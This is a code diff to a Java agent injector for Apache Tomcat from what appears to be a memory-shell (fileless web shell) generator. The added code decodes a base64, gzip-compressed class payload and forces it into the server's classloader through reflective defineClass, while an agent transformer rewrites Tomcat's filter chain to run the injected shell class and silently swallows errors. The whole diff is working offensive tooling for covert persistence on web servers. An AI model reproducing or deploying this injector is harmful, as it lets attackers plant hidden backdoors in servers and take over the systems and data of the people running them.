@@ -2,9 +2,12 @@ package com.reajason.javaweb.memshell.injector.tomcat;
 
 import org.objectweb.asm.*;
 
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
 import java.lang.instrument.ClassFileTransformer;
 import java.lang.instrument.Instrumentation;
 import java.security.ProtectionDomain;
+import java.util.zip.GZIPInputStream;
 
 /**
  * @author ReaJason
@@ -16,6 +19,10 @@ public class TomcatFilterChainAgentInjector implements ClassFileTransformer {
 
     public static String getClassName() {
         return "{{advisorName}}";
+    }
+
+    public static String getBase64String() {
+        return "{{base64String}}";
     }
 
     public static void premain(String args, Instrumentation inst) throws Exception {
@@ -42,6 +49,7 @@ public class TomcatFilterChainAgentInjector implements ClassFileTransformer {
     public byte[] transform(final ClassLoader loader, String className, Class<?> classBeingRedefined,
                             ProtectionDomain protectionDomain, byte[] bytes) {
         if (TARGET_CLASS.equals(className)) {
+            defineTargetClass(loader);
             try {
                 ClassReader cr = new ClassReader(bytes);
                 ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES) {
@@ -70,7 +78,7 @@ public class TomcatFilterChainAgentInjector implements ClassFileTransformer {
                 MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
                 if (TARGET_METHOD_NAME.equals(name)) {
                     Type[] argumentTypes = Type.getArgumentTypes(descriptor);
-                    return new AgentShellMethodVisitor(mv, argumentTypes, getClassName());
+                    return new TomcatFilterChainAgentInjector.AgentShellMethodVisitor(mv, argumentTypes, getClassName());
                 }
                 return mv;
             }
@@ -148,6 +156,60 @@ public class TomcatFilterChainAgentInjector implements ClassFileTransformer {
                 index += argumentTypes[i].getSize();
             }
             return index;
+        }
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] decodeBase64(String base64Str) throws Exception {
+        Class<?> decoderClass;
+        try {
+            decoderClass = Class.forName("java.util.Base64");
+            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
+        } catch (Exception ignored) {
+            decoderClass = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
+        }
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] gzipDecompress(byte[] compressedData) {
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        GZIPInputStream gzipInputStream = null;
+        try {
+            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
+            byte[] buffer = new byte[4096];
+            int n;
+            while ((n = gzipInputStream.read(buffer)) > 0) {
+                out.write(buffer, 0, n);
+            }
+            return out.toByteArray();
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        } finally {
+            try {
+                if (gzipInputStream != null) {
+                    gzipInputStream.close();
+                }
+                out.close();
+            } catch (Exception ignored) {
+            }
+        }
+    }
+
+    @SuppressWarnings("all")
+    public void defineTargetClass(ClassLoader loader) {
+        try {
+            loader.loadClass(getClassName());
+            return;
+        } catch (ClassNotFoundException ignored) {
+        }
+        try {
+            byte[] classBytecode = gzipDecompress(decodeBase64(getBase64String()));
+            java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+            defineClass.setAccessible(true);
+            defineClass.invoke(loader, classBytecode, 0, classBytecode.length);
+        } catch (Exception ignored) {
         }
     }
 }
